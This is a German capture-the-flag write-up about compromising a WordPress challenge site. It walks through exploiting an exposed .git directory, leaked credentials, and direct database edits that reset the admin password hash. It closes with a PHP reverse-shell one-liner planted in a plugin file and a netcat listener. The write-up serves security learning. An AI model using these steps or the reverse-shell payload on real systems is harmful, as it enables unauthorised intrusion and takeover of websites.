# Security Summit

> There is a new webpage about an upcoming conference.

Für diese Challenge haben wir Zugriff auf eine Wordpress-Webseite und eine Datenbank. Die Webseite informiert über den anstehenden Security Summit des HackHigh Insitute. Für **nur** 2.000€ kann man teilnehmen. Schnäppchen.

Beim Umschauen auf der Seite finden wir schonmal einen Benutzernamen: `sec-admin`. Ansonsten ist auf den ersten Blick nichts auffällig. Auch wenn eine aufmerksame Hackerin bereits beim ersten Posting über den Satz `"we switched over to a versioned approach of our installation and assets via git"` gestolpert wäre.

Für Wordpress-Blogs ist [wpscan](https://wpscan.com/wordpress-security-scanner) ein unverzichtbares Tool. Es kommt mit Kali Linux und kann sofort und ohne API-Token benutzt werden. Man kann allerdings auch ein kostenloses Konto anlegen und mit dem API-Token täglich bis zu 75 Requests an die wpscan Datenbank senden für bessere Ergebnisse. 

In diesem Fall liefert `wpscan` allerdings keine brauchbaren Ergebnisse. Die Wordpress Version ist aktuell und auch sonst scheint nichts auffällig zu sein. Ein Directory Scan (z.B. `dirb <URL>`) zeigt aber schnell etwas Brauchbares an: `+ http://10.65.59.68/.git/HEAD (CODE:200|SIZE:21)`. Jetzt ist also auch die nicht ganz so aufmerksame Hackerin auf das git-Verzeichnis gestoßen.

An dieser Stelle musste ich erstmal recherchieren und bin dabei auf diesen sehr guten Blogeintrag gestoßen: [infosecwriteups.com/exposed-git-directory-exploitation](https://infosecwriteups.com/exposed-git-directory-exploitation-3e30481e8d75) In diesem wird wiederum auf die [GitTools](https://github.com/internetwache/GitTools) verwiesen. Mit dem `gitdumper` lässt sich ein `.git` repository von einer Homepage herunterladen. (Das dauert unter Umständen lange. Zeit für einen Kaffee oder eine der anderen Challenges.)

Jetzt kann man sich zum Beispiel den letzten Commit anschauen:

`add debug file with password` klingt genau nach dem, was wir suchen. Das Repository lässt sich mit `git restore .` auf den Zustand des letzten Commits bringen. Dort findet man dann die eben erwähnte debug file mit einem Benutzernamen und einem Passwort:

Und auch die Datei `wp-config.php` hält Interessantes bereit:
```
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpress' );

/** Database password */
define( 'DB_PASSWORD', getenv('WP_DB_PASSWORD') );
```

 Aber erstmal einen Blick auf die Debug-Seite werfen. Tatsächlich wird hier nach einem Login gefragt.

Mit den Daten aus der `debug.php` kann man sich hier einloggen und stößt auf eine default php Seite die uns viele Informationen über das zugrunde liegende System liefert. Unter anderem haben wir hier Einblick in die Umgebungsvariablen und damit dem Passwort für die Datenbank, das gleichzeitig die erste Flag ist.

Hiermit und mit den Daten aus der `wp-config.php` lässt sich nun mit `mysql -u wordpress -h <ip> -P 3306 -D wordpress -p` bei dem DB-Server anmelden.

- `show tables;` zeigt unter anderem eine Tabelle `wp_users`
- `select * from wp_users;` zeigt genau einen Benutzer: sec-admin und einen zugehörigen Passwort-Hash

Hier habe ich verschiedene Dinge ausprobiert, von denen das Letzte erfolgreich war:
1. Ich habe versucht, den Passwort-Hash zu knracken, kein Erfolg
2. Ich habe einen neuen Benutzer angelegt
	1. dafür habe ich auf https://asecuritysite.com/hash/phpasseinen Passwort Hash generiert
	2. `INSERT INTO wp_users (user_login, user_pass, user_registered) VALUES ('test', '$P$5ZDzPE45CpsDdVTlB.VHHns6sOXNp4/', 2023-03-02');`
	3. nach dem Einloggen hatte ich keinen Zugriff auf's Dashboard
3. Ich habe den Passwort Hash des Users sec-admin zu einem mir bekannten Passwort geändert
	1. dafür habe ich auf https://asecuritysite.com/hash/phpasseinen Passwort Hash generiert
	2. `update wp_users set user_pass='$P$5ZDzPE45CpsDdVTlB.VHHns6sOXNp4/' where id=1;`
	3. BINGO!

Als Admin eingeloggt auf dem Dashboard habe ich geschaut, ob es gegebenenfalls ausnutzbare installierte Plugins gibt. Tatsächlich findet man ein Plugin das sich nach kurzer Recherche als geeignet für eine PHP-Reverse-Shell zeigt.

Unter `Tools -> Plugin File Editor` lässt sich die Datei `hello.php` bearbeiten. Hier kann man zum Beispiel einen Reverse Shell Oneliner einfügen. Eine gute Quelle dafür ist immer [swisskeyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php). Ich habe mich für `$sock=fsockopen("<my-ip>",4444);$proc=proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);` entschieden und es vor die erste Funktion `hello_dolly_get_lyric()` kopiert. Mit `nc -lnvp 4444` einen Listener erstellt, das Plugin aktiviert ud die Reverse Shell erhalten. Die zweite FLag findet man nach kurzem Suchen dann unter `/flag/here_you_go`.

